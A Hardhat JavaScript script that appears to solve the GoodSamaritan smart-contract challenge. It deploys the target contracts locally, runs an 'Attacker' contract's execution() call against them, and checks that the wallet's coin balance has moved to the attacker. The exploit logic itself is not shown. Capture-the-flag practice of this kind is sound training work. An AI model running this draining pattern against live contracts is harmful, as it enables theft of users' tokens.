const {
    network,
    ethers
} = require("hardhat");
const hre = require("hardhat");

async function main() {
    const [user] = await ethers.getSigners()
    const userAddress = await user.getAddress()
    console.log("user = ", userAddress)

    // deplay the contract
    const goodSamaritanContract = await ethers.deployContract("GoodSamaritan")
    const goodSamaritanAddress = await goodSamaritanContract.getAddress()
    console.log("good samaritan contract = ", goodSamaritanAddress)

    const coinAddress = await goodSamaritanContract.coin()
    const coinContract = await ethers.getContractAt("Coin", coinAddress)
    console.log("coin contract = ", coinAddress)

    const walletAddress = await goodSamaritanContract.wallet()
    const walletContract = await ethers.getContractAt("Wallet", walletAddress)
    console.log("wallet contract = ", walletAddress)

    const attackerContract = await ethers.deployContract("Attacker")
    const attackerAddress = await attackerContract.getAddress()
    console.log("attacker contract = ", attackerAddress)

    const attackTx = await attackerContract.execution(goodSamaritanAddress)
    //
   await ethers.provider.getTransactionReceipt(attackTx.hash).then((receipt) => {
        console.log("tx receipt = ", receipt)
    })
    // check result
    const walletBalance = await coinContract.balances(walletAddress)
    const userBalance = await coinContract.balances(attackerAddress)
    console.log("wallet balance = ", walletBalance, "user balance = ", userBalance)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});